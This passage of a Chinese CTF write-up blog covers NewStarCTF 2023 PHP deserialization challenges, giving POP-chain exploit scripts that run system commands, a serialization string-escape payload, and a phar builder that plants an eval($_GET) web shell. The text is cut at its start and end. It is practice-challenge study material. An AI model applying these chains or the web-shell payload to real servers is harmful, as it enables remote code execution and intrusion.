class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>发现在whitegod中可以进行rce</p><p>构造pop链begin——&gt;then—-&gt;super—-&gt;handle—-&gt;ctf—–&gt;whitegod</p><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-More-Fast"><a href="#NewStarCTF-2023-公开赛道-More-Fast" class="headerlink" title="[NewStarCTF 2023 公开赛道]More Fast"></a>[NewStarCTF 2023 公开赛道]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">      (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>有一个gc回收机制，所有要在触发前利用die提前停止</p><p>另外PHP 的特性：<code>die(object)</code> 会隐式调用 <code>__toString()</code></p><p>crypto中有未知属性good会调用get</p><p>在crypto中会调用函数触发invoke</p><p>pwn中的evil为web中的对象</p><p>所有pop链应从start—&gt;crypto—&gt;reverse—&gt;pwn—&gt;web</p><p>最终exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat /fl\ag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Start</span>-&gt;errMsg=<span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj=<span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func=<span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Start</span>);</span><br></pre></td></tr></table></figure><p>但是不理解为什么要将payload最后的}删去</p><h1 id="NewStarCTF-2023-公开赛道-逃"><a href="#NewStarCTF-2023-公开赛道-逃" class="headerlink" title="[NewStarCTF 2023 公开赛道]逃"></a>[NewStarCTF 2023 公开赛道]逃</h1><p>字符串增多的逃逸题目</p><?phphighlight_file(__FILE__);function waf($str){  return str_replace("bad","good",$str);}class GetFlag {  public $key;  public $cmd = "whoami";  public function __construct($key)  {    $this->key = $key;  }  public function __destruct()  {    system($this->cmd);  }}unserialize(waf(serialize(new GetFlag($_GET['key']))));利用替换增加的一个字符构造指令将越来的踢出去<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a=new GetFlag(&quot;bad&quot;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\&quot;;s:3:\&quot;cmd\&quot;;s:4:\&quot;ls /\&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure># [NewStarCTF 2023 公开赛道]PharOnephar反序列化发现源码中存在class.php文件上传phar文件<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210529787.png" class="" title="image-20250705210529787">直接上传发现其过滤掉了__HALT_COMPILER()，<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210716993.png" class="" title="image-20250705210716993">gzip压缩绕过参考文章[PHP(Phar) 反序列化漏洞及各种绕过姿势](https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-反序列化漏洞及各种绕过姿势.html#phar反序列化)<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705211012947-1751721014553-3.png" class="" title="image-20250705211012947">压缩后使用jpg后缀即可上传后使用phar协议读取文件即可执行phar文件上传木马file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706003448663.png" class="" title="image-20250706003448663"># [NewStarCTF 2023 公开赛道]Unserialize Again<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 